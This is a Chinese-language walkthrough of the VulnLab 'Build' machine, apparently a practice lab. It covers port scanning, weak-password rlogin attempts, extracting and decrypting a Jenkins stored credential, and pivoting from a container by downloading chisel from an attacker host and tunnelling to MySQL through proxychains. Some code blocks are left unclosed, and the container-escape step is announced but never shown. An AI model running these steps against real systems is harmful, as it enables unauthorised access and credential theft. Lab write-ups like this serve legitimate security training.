针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 10.10.81.227
```

![image-20241226221708367](https://s2.loli.net/2024/12/26/oNnxOemaRv3dgfz.png)

针对目标服务器开放端口进行相应的

```
sudo nmap -p22,53,512,513,514,873,3000,3306,8081 -A -sV 10.10.81.227 -oN Build.txt
```

![image-20241226221739402](https://s2.loli.net/2024/12/26/OjIsTeWnRVKS1wN.png)

针对512，513，514端口我们从来没有见过，通过hackertricks进行搜索（https://book.hacktricks.xyz/network-services-pentesting/512-pentesting-rexec）

```
sudo apt search rsh-client
```

我们搜索会发现没有这个包，我们kali软件库的另外一个包

```
sudo apt-get install rsh-redone-client
```

我们尝试下弱密码登录,因为她属于老版本的ssh，我们尝试root

```
rlogin 10.10.101.111 -l root
```

尝试了几个弱密码后均失败

访问3000端口的相关服务内容

![image-20241226222203622](https://s2.loli.net/2024/12/26/ut9DI26ZgaHswyr.png)

可以看到一个软件版本gitea 1.21.11，通过google搜索发现这是一个相当新的版本，没有可以直接利用的漏洞

我们优先针对应用进行一个目录扫描

```
dirsearch -u http://10.10.100.148:3000/

![image-20241227111607763](https://files.seeusercontent.com/2026/04/08/9bTw/image-20241227111607763.png)

发现有相当多的Jenkins配置文件内容，我们查看相关的文件是否有能够值得利用的密码配置等

```
find /home/zkpc/Documents/vulnlab/Linux/5.Build/jenkins/backups/jenkins_configuration -type f -exec grep -l 'pass\|db_pass' {} + 2>/dev/null
cat /home/zkpc/Documents/vulnlab/Linux/5.Build/jenkins/backups/jenkins_configuration/jobs/build/config.xml
```

![image-20241227145109642](https://s2.loli.net/2024/12/27/nG659Z7bteXKAD3.png)

我们发现了一组之前在gitea发现的用户名，同时有其密码，看着应该是进行了下编码或加密

username:buildadm

password:{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}

我们使用了cyberchief和john等都无法解密，考虑到这是Jenkins中的密码，我们搜索是否有Jenkins密码解密工具

通过Google搜索，找到以下工具（https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py）

```
.venv/bin/python -m pip install pycryptodome
.venv/bin/python jenkins_offline_decrypt.py jenkins/backups/jenkins_configuration/secrets/master.key jenkins/backups/jenkins_configuration/secrets/hudson.util.Secret jenkins/backups/jenkins_configuration/jobs/build/config.xml
```

![image-20241229155953443](https://s2.loli.net/2024/12/29/7W9LAIYfvVKNgXJ.png)

接着我们需要开始考虑容器逃逸的问题突破到宿主机

```

![image-20241229163040077](https://s2.loli.net/2024/12/29/zuBhHAMt1vxcZLC.png)

以下文章介绍了对应的如何来阅读这个网络

```
010012AC 172.18.0.1(十六进制反过来阅读)
000012AC
```

网关地址我们获取了，在nmap扫描中我们发现3306和8081是过滤状态，我们查看容器内是否能访问

```
cat < /dev/tcp/172.18.0.1/3306
curl http://172.18.0.1:8081 -I
```

![image-20241229164209146](https://s2.loli.net/2024/12/29/VMPF6Kr9ZLhcTfe.png)

我们尝试使用chisel来代理流量

```
curl -O http://10.8.4.161/chisel_1.10.1_linux_amd64
chmod +x chisel_1.10.1_linux_amd64

./chisel_1.10.1_linux_amd64 server -p 8000 --reverse
./chisel_1.10.1_linux_amd64 client 10.8.4.161:8000 R:9050:socks
```

修改proxychains

```
socks5 127.0.0.1 9050
```

进行相应的链接

```
sudo proxychains -q mysql -h 172.18.0.1 -u root
```
